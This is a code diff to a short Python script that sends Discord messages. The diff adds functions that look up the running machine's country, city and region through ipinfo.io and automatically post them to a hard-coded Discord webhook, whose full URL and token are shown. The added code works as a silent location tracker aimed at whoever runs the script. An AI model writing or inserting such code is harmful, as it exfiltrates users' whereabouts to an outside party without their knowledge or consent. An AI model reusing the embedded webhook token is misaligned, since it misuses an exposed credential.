@@ -27,3 +27,22 @@ if response.status_code == 204:
     print("Message sent!")
 else:
     print(f"Failed: {response.status_code} - {response.text}")
+
+def get_location():
+    url = "https://ipinfo.io/json"
+    response = requests.get(url)
+    data = response.json()
+    country = data['country']
+    city = data['city']
+    region = data['region']
+    return country, city, region
+
+def send_to_discord(webhook_url, country, city, region):
+    payload = {
+        "content": f"Country: {country}\nCity: {city}\nState: {region}"
+    }
+    requests.post(webhook_url, json=payload)
+
+webhook_url2 = "https://discord.com/api/webhooks/1371285744836022382/fF1bWnuvkqvUv8XoYpotZU4QThuk-MgkAUtNSgCV0z4Br6v2RzpaaN4KqZ21FA6NuayV"
+country, city, region = get_location()
+send_to_discord(webhook_url2, country, city, region)
